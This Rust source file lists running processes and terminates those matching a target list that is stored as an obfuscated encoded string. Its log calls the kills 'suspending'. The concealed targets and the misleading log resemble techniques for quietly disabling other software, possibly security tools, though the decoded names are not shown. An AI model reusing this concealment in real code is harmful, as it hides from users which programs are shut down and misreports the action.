use psutil::process::{ self, Process, ProcessError };

mod printer;
use printer::{ success, error, info };

mod decoder;


fn main() {
    let pid_vec = process::processes().unwrap();
    let tgt_vec = build_target();

    let mut suspended = 0;
    let mut total     = 0;

    for pid_result in pid_vec.into_iter() {
        match pid_result {
            Ok(proc) => {
                if suspend_target_proc(&proc, &tgt_vec) {
                    suspended += 1;
                }
                total += 1;
            }, 
            Err(err) => {
                handle_proc_error(err);
            },
        }
    }

    success( "Done!", Some(format!("[ {suspended} / {total} ]").as_str()) );
}

fn handle_proc_error(err: ProcessError) {
    match err {
        ProcessError::NoSuchProcess { pid     } => { error("No corresponding process", Some(format!("( pid {pid} )").as_str())); },
        ProcessError::ZombieProcess { pid     } => { error("Is zombie process",        Some(format!("( pid {pid} )").as_str())); },
        ProcessError::AccessDenied  { pid     } => { error("Access denied",            Some(format!("( pid {pid} )").as_str())); },
        ProcessError::PsutilError   { pid, .. } => { error("Internal error",           Some(format!("( pid {pid} )").as_str())); },
    };
}

fn suspend_target_proc(proc: &Process, target_vec: &Vec<String>) -> bool {
    let proc_name_result = proc.name();

    if proc_name_result.is_err() {
        return false;
    }

    let proc_name = proc_name_result.unwrap();

    if !target_vec.contains(&proc_name) {
        return false;
    }

    info("Process suspending...", Some(format!("( {proc_name} )").as_str()));

    proc.terminate().is_ok()
}

fn build_target() -> Vec<String> {
    let bytes = decoder::decode("EHQ&*E--2@:2OENF*)G@G@b5lB4Yt&:2OENF*)G@G@b6)G&g>qBP)-n@sWH<:2XZ^GA;AJAn1");

    if bytes.is_err() {
        error("Decoder decode failed", None);
        panic!();
    }

    String::from_utf8(bytes.unwrap()).unwrap().split("N").map(str::to_string).collect()
}
